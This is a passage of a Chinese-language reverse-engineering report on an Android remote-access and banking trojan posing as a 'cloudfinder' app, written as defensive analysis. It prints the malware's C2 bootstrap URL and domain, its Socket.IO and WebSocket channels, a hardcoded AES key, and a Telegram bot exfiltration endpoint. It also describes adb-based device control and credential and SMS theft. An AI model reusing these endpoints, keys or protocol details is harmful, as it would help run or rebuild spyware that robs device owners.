## 2. 结论（性质判定）

这是一个**全功能 Android 远控木马（RAT）＋ 金融钓鱼/按键窃取混合体**，具备“屏幕实时控制 + 无障碍自动化 + 免 root 的 adb 自控 + 密码/短信/通知窃取 + 假更新界面掩护 + 自动提权保活”的完整杀伤链。其界面伪装（Google Play Protect 安全提醒、系统更新进度条）与行为组合，与“远控 + 银行木马注入”同类家族一致。

它不是正常的“云盘/文件管理”类应用：`cloudfinder` 仅是伪装名，全部业务代码都是远控指令与数据外传。

## 5. 通信体系（摘要，详见 `02-通信协议.md`）

四级结构，全部明文域名 + 自签信任 + AES 信封：

```
① 引导   GET https://www.cohuducox.com/adv.php?apk=10068&device=<android_id>
          → {"token":"<Base64(AES-ECB(JSON))>"} → {host, domain, port}
② 指令   Socket.IO  https://{host}/io{port}/?apkid=10068&line=<token>&cmode=test&device=<id>&ver=v4.0
          事件 login / deviceOnline；出站 "enc msg"（AES 信封）；入站 new_msg（AES 信封）
③ 数据   wss://{host}:443/ws/binary-device?deviceId=<id>    二进制帧，屏幕/UI 树/图片/指令
④ 旁路   POST /api/device_log、/api/ocr-captcha、GET /api/battery_config、Telegram Bot 告警
```

- 加密：`AES/ECB/PKCS5Padding`，16 字节硬编码密钥 `0623U25KTT3YO8P9`（`p081/C0762` 构造器），Base64 封装。
- 传输安全：全部 `HostnameVerifier` 返回 `true` + 空 `X509TrustManager`（信任任意证书），可被中间人任意劫持/伪造——这也是我们能在不接触真实服务器的情况下完整还原协议的原因。
- Telegram 外带通道：`POST https://api.telegram.org/bot8798681434:AAFX…sendMessage`，`chat_id=-5238151960`，`parse_mode=HTML` —— 运营者用 Telegram 收“上线/连接失败/adbShell 结果”等告警。

## 6. 原生库

| 库 | 大小 | 作用 |
|---|---|---|
| `lib/arm64-v8a/libadb.so` | 5,142,600 | **adb 客户端/服务端二进制**（Termux 构建，含 `protobuf-21.5`、`curl` 风格 HTML 资源、`/system/bin/adb` 回退路径、`ANDROID_ADB_SERVER_PORT=5037`）。用于无线调试配对后执行 `screencap`/`uiautomator`/`input`/`pm`，实现免无障碍的完整设备操控 |
| `lib/arm64-v8a/libnative-guard.so` | 7,504 | 反调试看门狗：导入 `ptrace/fopen/fgets/atoi/pthread_create/sleep/_exit`，读 `/proc/self/status`（TracerPid）后 `_exit`；导出 5 个 JNI 函数 |
| `lib/armeabi-v7a/*` | 3,747,472 / 5,804 | 同上 32 位版本 |

**反向发现（已验证）**：`libnative-guard.so` 导出的 JNI 符号名为
`Java_com_example_myapplication_util_N_{d,isDebug,startGuard,buildUrl,buildWsUrl}`，
而实际 Java 类为 `com.lite.cloudfinder.util.N`（仅声明 `native void startGuard()`），且库内**不存在 `JNI_OnLoad`/`RegisterNatives`**（`dynsym` 22 项已逐条核对）。
因此 `System.loadLibrary` 成功后 `startGuard()` 必定抛 `UnsatisfiedLinkError`，而 `App.onCreate()` 用 `catch (Throwable)` 静默吞掉：

```java
try { N.startGuard(); } catch (Throwable unused2) { }
```

→ 本包的**反调试守卫实际处于失效状态**；`buildUrl/buildWsUrl`（其中含 `wss://%s:%d/ws/binary-device?deviceId=%s` 与 `https://www.%s.com/adv.php?apk=%d&device=%s` 模板）同样是死代码，真实 URL 由 Java 侧 `p086/C0814`、`RunnableC0808` 构造。这两条证据互为交叉校验（见 `03-重编译与反向验证.md` §4）。
